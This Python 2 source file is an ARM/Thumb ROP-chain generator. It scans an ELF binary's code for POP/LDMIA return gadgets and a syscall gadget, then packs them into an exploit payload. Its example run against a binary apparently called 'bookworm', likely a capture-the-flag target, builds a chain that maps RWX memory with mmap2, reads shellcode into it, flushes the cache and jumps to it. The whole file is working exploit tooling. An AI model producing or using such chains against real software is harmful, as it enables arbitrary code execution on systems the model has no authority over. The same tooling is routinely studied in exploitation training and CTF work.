import thumb
import arm
import pyelf
import sys
import struct
import random

p32 = lambda x: struct.pack("<L", x)

def dict_keys_upper(d):
    d2 = {}
    for k,v in d.items():
        d2[k.upper()] = v
    return d2

class ROP:
    def __init__(self, f):
        if type(f) == str:
            f = open(f, "r")
        if type(f) == file:
            f = pyelf.ELFFile(f)
        text_sec = f.getsection(".text")
        text_data = text_sec.data
        text_addr = text_sec.addr
        self.disassembly_thumb = list(thumb.disassemble_all(text_data, text_addr))
        self.disassembly_arm = list(arm.disassemble_all(text_data, text_addr))
        self.pops = []
        self.ldmias = []
        self.swi_0 = None
        self.gadgets = []
        self.find_pops()
        self.find_ldmias()
        self.find_syscall_gadget()
        self.ropchain = []
        random.shuffle(self.gadgets)

    def find_pops(self):
        self.pops = filter(
                lambda (addr, inst): inst[0] == "POP" and "R15" in inst[1],
                self.disassembly_thumb)
        self.gadgets += [(addr | 1, inst[1]) for (addr, inst) in self.pops]

    def find_ldmias(self):
        for addr, inst in self.disassembly_arm:
            if inst[:3] == ("AL", "LDMIA", "R13!"):
                if "R13" not in inst[3] and "R15" in inst[3]:
                    self.ldmias.append((addr, inst))
                    self.gadgets.append((addr, inst[3]))

    def find_syscall_gadget(self):
        for i in range(len(self.disassembly_thumb)-1):
            addr, inst = self.disassembly_thumb[i]
            if inst != ("SWI", 0):
                continue
            addr2, inst2 = self.disassembly_thumb[i+1]
            if inst2[0] == "POP" and "R15" in inst2[1]:
                if self.swi_0 and len(inst2[1]) > len(self.swi_0[1][1]):
                    continue
                self.swi_0 = (addr, inst2)

    def find_best_gadget(self, regs):
        def gadget_score(gadget, regs):
            return len(set(gadget) - regs)
        #must contain atleast one register we want.
        gadgets = ((a,g) for (a,g) in self.gadgets if len(set(g) & regs) > 0)
        gadget = min(gadgets, key = lambda (a, g): gadget_score(g, regs))
        return gadget


    def set_regs(self, regs_dict, return_addr):
        regs_dict = dict_keys_upper(regs_dict)
        ropchain = []
        regs = set(regs_dict.keys())
        old_regs = None

        while regs and regs != old_regs:
            addr, reg_pops = self.find_best_gadget(regs)
            ropchain.append(addr)
            ropchain += [regs_dict.get(reg, 0x41414141) for reg in reg_pops[:-1]]
            old_regs = set(regs)
            regs -= set(reg_pops)

        ropchain += [return_addr]
        if regs:
            raise Exception("Unable to set registers %r from %r" % (regs, regs_dict))

        return ropchain[0], ropchain[1:]

    def do_swi(self, return_addr):
        if return_addr == None:
            return_addr = 0x41414141
        regs_dict= {"R15" : return_addr}
        ropchain = []
        if self.swi_0 == None:
            raise Exception("SWI 0 gadget not found. Cannot not perform syscall")
        addr, pop_inst = self.swi_0
        ropchain.append(addr | 1)
        ropchain += [regs_dict.get(reg, 0x41414141) for reg in pop_inst[1]]
        return ropchain[0], ropchain[1:]

    def lookup_symbol(self, name):
        raise Exception("Symbol lookup not implemented yet. Doit yourself.")

    def call(self, func, *args):
        if type(func) == str:
            func = self.lookup_symbol(func)
        regs_dict = dict(zip(["R0", "R1", "R2", "R3"], args))
        self.ropchain.append(("call", regs_dict, func))

    def do_syscall(self, regs_dict, return_addr):
        swi_addr, swirop = self.do_swi(return_addr)
        set_regs_addr, regsrop = self.set_regs(regs_dict, swi_addr)
        return set_regs_addr, (regsrop + swirop)

    def syscall(self, regs_dict):
        regs_dict = dict_keys_upper(regs_dict)
        self.ropchain.append(("syscall", regs_dict))

    def generate_ropchain(self):
        return_addr = None
        regs = set()
        rop = []
        roppart = []
        for i in self.ropchain[::-1]:
            regs_dict = i[1]
            if i[0] == "syscall":
                return_addr, roppart = self.do_syscall(regs_dict, return_addr)
            if i[0] == "call":
                if return_addr:
                    regs_dict["R14"] = return_addr
                return_addr, roppart = self.set_regs(regs_dict, i[2])
            rop = roppart+rop
        rop = [return_addr] + rop
        return rop

    def flush(self):
        ropchain = "".join(map(p32, self.generate_ropchain()))
        self.ropchain = []
        return ropchain

if __name__ == "__main__":
    rop = ROP("bookworm")
    rop.syscall({"R0":0xaa0000, "R1":0x1000, "R2":7, "R3":0x32, "R4":0xffffffff, "R5":0, "R7":192})
    rop.call(0x45454545, 0x11111111, 0x22222222, 0x55555555)
    rop.syscall({"R0":0, "R1":0xaa0000, "R2":0x142, "R7":3})
    rop.call(0xaaaaaaaa, 0x1e1e1e1e, 0x42424242, 0x99995555)
    rop.syscall({"R7":0xf0002})
    print map(hex, rop.generate_ropchain())
